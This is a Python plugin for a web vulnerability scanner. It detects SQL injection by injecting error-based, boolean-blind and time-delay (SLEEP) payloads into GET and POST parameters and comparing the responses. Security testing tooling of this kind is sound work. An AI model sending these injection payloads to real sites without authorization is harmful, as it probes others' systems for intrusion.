import time
from .base import ScannerPlugin
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
from utils import response_similarity, get_meaningful_content

class SQLiPlugin(ScannerPlugin):
    name = "sqli"
    description = "SQL注入检测（布尔盲注+时间盲注+报错注入）"
    severity = "high"

    SQL_ERRORS = [
        "SQL syntax", "mysql_fetch", "ORA-", "PostgreSQL", "SQLite",
        "Microsoft OLE DB", "ODBC Driver", "Unclosed quotation",
        "quoted string not properly terminated", "You have an error in your SQL syntax"
    ]

    def check_get(self, url):
        testable = self.get_testable_params(url, method="GET")
        if not testable:
            return False, {}
        for param, original_value in testable.items():
            result = self._test_injection(url, param, original_value, method="GET")
            if result:
                return True, result
        return False, {}

    def check_post(self, url, params):
        if not params:
            return False, {}
        testable = self.get_testable_params(url, method="POST", params=params)
        if not testable:
            return False, {}
        for param, original_value in testable.items():
            result = self._test_injection(url, param, original_value, method="POST", params=params)
            if result:
                return True, result
        return False, {}

    def _test_injection(self, url, param, original_value, method, params=None):
        # 报错注入
        error_payload = original_value + "'"
        resp = self._send_payload(url, param, error_payload, method, params)
        if resp and any(err in resp.text for err in self.SQL_ERRORS):
            return self._build_result(
                "error_based_sqli",
                f"参数 {param} 存在报错注入",
                {"param": param, "payload": error_payload, "evidence": resp.text[:200]}
            )
        # 布尔盲注
        true_payload = original_value + "' AND '1'='1"
        false_payload = original_value + "' AND '1'='2"
        resp_true = self._send_payload(url, param, true_payload, method, params)
        resp_false = self._send_payload(url, param, false_payload, method, params)
        if resp_true and resp_false:
            true_content = get_meaningful_content(resp_true.text)
            false_content = get_meaningful_content(resp_false.text)
            sim = response_similarity(true_content, false_content)
            if sim < 0.95:
                resp_true2 = self._send_payload(url, param, true_payload, method, params)
                resp_false2 = self._send_payload(url, param, false_payload, method, params)
                if resp_true2 and resp_false2:
                    sim2 = response_similarity(
                        get_meaningful_content(resp_true2.text),
                        get_meaningful_content(resp_false2.text)
                    )
                    if sim2 < 0.95:
                        return self._build_result(
                            "boolean_based_sqli",
                            f"参数 {param} 存在布尔盲注",
                            {"param": param, "true_payload": true_payload, "false_payload": false_payload}
                        )
        # 时间盲注
        time_payload = original_value + "' AND SLEEP(5)-- -"
        start = time.time()
        resp = self._send_payload(url, param, time_payload, method, params, timeout=15)
        elapsed = time.time() - start
        if resp and elapsed > 4.5:
            return self._build_result(
                "time_based_sqli",
                f"参数 {param} 存在时间盲注（延迟 {elapsed:.2f}s）",
                {"param": param, "payload": time_payload, "elapsed": elapsed}
            )
        return None

    def _send_payload(self, url, param, payload, method="GET", params=None, timeout=10):
        if method == "GET":
            parsed = urlparse(url)
            query = parse_qs(parsed.query)
            query[param] = [payload]
            test_url = urlunparse(parsed._replace(query=urlencode(query, doseq=True)))
            return self.safe_request("GET", test_url, timeout=timeout)
        else:
            test_params = params.copy()
            test_params[param] = payload
            return self.safe_request("POST", url, data=test_params, timeout=timeout)